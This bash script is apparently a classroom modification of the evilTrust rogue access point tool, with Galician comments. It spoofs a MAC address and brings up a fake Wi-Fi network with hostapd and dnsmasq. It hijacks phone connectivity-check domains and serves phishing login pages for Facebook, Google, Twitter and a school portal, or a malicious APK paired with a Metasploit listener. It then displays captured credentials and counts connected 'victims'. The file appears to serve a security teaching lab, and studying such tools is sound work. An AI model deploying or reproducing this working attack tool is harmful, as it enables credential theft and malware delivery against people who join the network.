#!/bin/bash

# Original File:
  # evilTrust v2.0, Author @s4vitar (Marcelo Vázquez)
  # git clone https://github.com/s4vitar/evilTrust.git
# This file was modified by:
  # Author: ricardofc (Ricardo Feijoo Costa) 
  # DATA:   2021-12-30 19:21:27.840208858 +0000
  # URLs:
    # [1] https://wireless.wiki.kernel.org/en/users/documentation/hostapd#details_of_nl80211
#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
	rm dnsmasq.conf hostapd.conf 2>/dev/null
	data=$(date +%F-%T)
	find \-name datos-privados.txt | xargs -I U cp -pv U U-${data}.txt 2>/dev/null
	find \-name datos-privados.txt | xargs rm 2>/dev/null
	#####Non é necesario desactivar modo monitor de wlan0. Hoxe en día [1]
        ####Eliminar regras iptables
        iptables -F && iptables -F -t nat
        ####Deshabilitar enrutamento entre tarxetas
        echo 0 > /proc/sys/net/ipv4/ip_forward
        ####Devolver a MAC Address REAL
	####timeout 90 bash utilities/wlan0.sh ${REAL_MAC}
        macchanger -p wlan0
        ####Eliminar configuración rede wlan0
        ip addr del 172.16.31.1/24 dev wlan0
	####Nas novas versións de kali: network-manager non se executa como daemon
	tput cnorm; service network-manager restart > /dev/null 2>&1 || (pkill NetworkManager > /dev/null 2>&1 && /usr/bin/NetworkManager --no-daemon > /dev/null 2>&1)
	exit 0
}

function getCredentials(){
        ####Permitimos saída a Internet. 
        ####Como imos traballar cunha Raspberry Pi 4(ou 400) Imos traballar con:
        ####1 tarxeta WIFI: wlan0 -> empregada para o Rogue AP
        ####1 tarxeta cableada: eth0 -> permitirá saída a Internet unha vez feito ip_forward e MASQUERADE (ver regras iptables). 
        echo 1 > /proc/sys/net/ipv4/ip_forward
        iptables-restore < ./utilities/iptables.ipv4.nat
        /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant &

	activeHosts=0
	tput civis; while true; do
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
		find \-name datos-privados.txt | xargs cat 2>/dev/null
		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
		####Cambiamos rede ataque: 172.16.31.1/24
		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "172.16.31.1 " | wc -l)
		sleep 3; clear
	done
}

function guiMode(){
	tput civis; dependencias=(php dnsmasq hostapd terminator)

        counter_dep=0; for programa in "${dependencias[@]}"; do
                if [ "$(command -v $programa)" ]; then
                        let counter_dep+=1
                else
                  apt update && apt -y install $programa
                fi; sleep 0.4
        done

	tput civis; if [[ -e credenciales.txt ]]; then
                rm -rf credenciales.txt
        fi

	#####Non é necesario activar wlan0 en modo monitor. Hoxe en día [1]
        ####Escollemos automaticamente wlan0 como NIC para o Rogue AP
	choosed_interface='wlan0'

        ####MAC Spooffing wlan0 - FAKE MAC TP_LINK
        export REAL_MAC=$(ip link show ${choosed_interface} | awk '/ether/ {print $2}')
	tput civis; timeout 90 bash utilities/wlan0.sh c4:e9:84:43:d3:7a
        FAKE_MAC=$(ip link show ${choosed_interface} | awk '/ether/ {print $2}')
        while [ ${REAL_MAC} = ${FAKE_MAC} ];do
          sleep 1
          FAKE_MAC=$(ip link show ${choosed_interface} | awk '/ether/ {print $2}')
        done


	####Podemos modificar no arranque se queremos un SSID e un canal determinado a través de /boot/cmdline.txt.
        ######Por defecto: SSID=ALU-SMR, channel=7
        ######Para modificar executar utilities/change-cmdline.sh
	use_ssid=$(awk '{print $NF}' /proc/cmdline | grep ap)
        if [ $? -eq '0' ];then
          # Última columna en /proc/cmdline, quedándonos co primeiro campo antes do caracter 2 puntos -> ap=ssid:channel --> ssid 
	  use_ssid=$(awk -F= '{print $NF}' /proc/cmdline | cut -d ':' -f1)
        else
          use_ssid='ALU-2SMR'  
        fi
	use_channel=$(awk '{print $NF}' /proc/cmdline | grep ap)
        if [ $? -eq '0' ];then
          # Última columna en /proc/cmdline, quedándonos co segundo campo antes do caracter 2 puntos -> ap=ssid:channel --> channel 
	  use_channel=$(awk -F= '{print $NF}' /proc/cmdline | cut -d ':' -f2)  
        else
          use_channel='7'
        fi
	##Nas novas versións de kali: network-manager non se executa como daemon
        killall network-manager > /dev/null 2>&1 || pkill NetworkManager > /dev/null 2>&1
        killall hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
        sleep 5

        echo -e "interface=$choosed_interface\n" > hostapd.conf
	echo -e "driver=nl80211\n" >> hostapd.conf
        echo -e "bssid=${FAKE_MAC}\n" >> hostapd.conf
        echo -e "ssid=$use_ssid\n" >> hostapd.conf
        echo -e "hw_mode=g\n" >> hostapd.conf
        echo -e "channel=$use_channel\n" >> hostapd.conf
        echo -e "macaddr_acl=0\n" >> hostapd.conf
        echo -e "auth_algs=1\n" >> hostapd.conf
        echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf

        sleep 2
        ##hostapd hostapd.conf > /dev/null 2>&1 &
        hostapd hostapd.conf &
        sleep 6

        echo -e "interface=$choosed_interface\n" > dnsmasq.conf
        echo -e "dhcp-range=172.16.31.2,172.16.31.30,255.255.255.0,12h\n" >> dnsmasq.conf
        echo -e "dhcp-option=3,172.16.31.1\n" >> dnsmasq.conf
        echo -e "dhcp-option=6,172.16.31.1\n" >> dnsmasq.conf
        echo -e "server=8.8.8.8\n" >> dnsmasq.conf
        echo -e "log-queries\n" >> dnsmasq.conf
        echo -e "log-dhcp\n" >> dnsmasq.conf
        echo -e "listen-address=172.16.31.1\n" >> dnsmasq.conf
        ####	echo -e "address=/#/172.16.31.1\n" >> dnsmasq.conf #Todos os dominios ao noso server web Rogue AP
        ####    echo -e "address=/www.edu.xunta.gal/www.edu.xunta.es/www.google.es/connectivitycheck.platform.hicloud.com/172.16.31.1\n" >> dnsmasq.conf #Soamente estes dominios ao noso server web Rogue AP. Os dominios conectivitycheck server para os móbiles e simular un portal cautivo, tal que se queren acceder deben deben executar o acceso
        ##      echo 172.16.31.1 3w.edu.xunta.gal >> /etc/hosts #Tamén poderiamos engadir entradas de hosts locais(non existentes en servidores DNS) en /etc/hosts para que sexan resoltas por dnsmasq
        echo -e "address=/connectivitycheck.platform.hicloud.com/connectivitycheck.gstatic.com/172.16.31.1\n" >> dnsmasq.conf #Pensado soamente para móbiles, tal que solicitan acceso a un simulado Portal Cautivo
	echo -e "dhcp-leasefile=/tmp/dhcp.leases" >> dnsmasq.conf

        ifconfig $choosed_interface up 172.16.31.1 netmask 255.255.255.0
        sleep 1
        route add -net 172.16.31.0 netmask 255.255.255.0 gw 172.16.31.1
        sleep 1
        dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
        sleep 5

        # Array de plantillas
        ### Added template ies-ald-login
        plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one ies-ald-login)

        ####        facebook-login "Plantilla de inicio de sesión de Facebook" 
        ####        google-login "Plantilla de inicio de sesión de Google" 
        ####        starbucks-login "Plantilla de inicio de sesión de Starbucks" 
        ####        twitter-login "Plantilla de inicio de sesión de Twitter" 
        ####        yahoo-login "Plantilla de inicio de sesión de yahoo" 
        ####        cliqq-payload "Plantilla con despliege de APK malicioso" 
        ####        optimumwifi "Plantilla de inicio de sesión para el uso de WiFi (Selección de ISP)" 
        ####        all_in_one "Plantilla todo en uno (múltiples portales centralizados)" 
        ####	    ies-ald-login "Plantilla Taller Prácticas SI"

	####De forma automática arranca template=ies-ald-login. Non se pode escoller. Para probar outra cambiar variable template
	template='ies-ald-login'

        check_plantillas=0

        if [ "$template" == "cliqq-payload" ]; then
                check_plantillas=2
        else
                check_plantillas=1
        fi; clear

        if [ $check_plantillas -eq 1 ]; then
                tput civis; pushd $template > /dev/null 2>&1
                php -S 172.16.31.1:80 > /dev/null 2>&1 &
                sleep 2
                popd > /dev/null 2>&1; getCredentials
        elif [ $check_plantillas -eq 2 ]; then
		whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                tput civis; pushd $template > /dev/null 2>&1
                php -S 172.16.31.1:80 > /dev/null 2>&1 &
                sleep 2
		whiptail --title "evilTrust - by S4vitar" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
                popd > /dev/null 2>&1; getCredentials
	else
		clear
	        echo -e "\n${redColour}[!] Revisa a variable template${endColour}"
                exit 44
        fi
}

# Main Program

if [ "$(id -u)" == "0" ]; then
####Deixamos soamente activa a opción gui -> guimode()
	guiMode
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
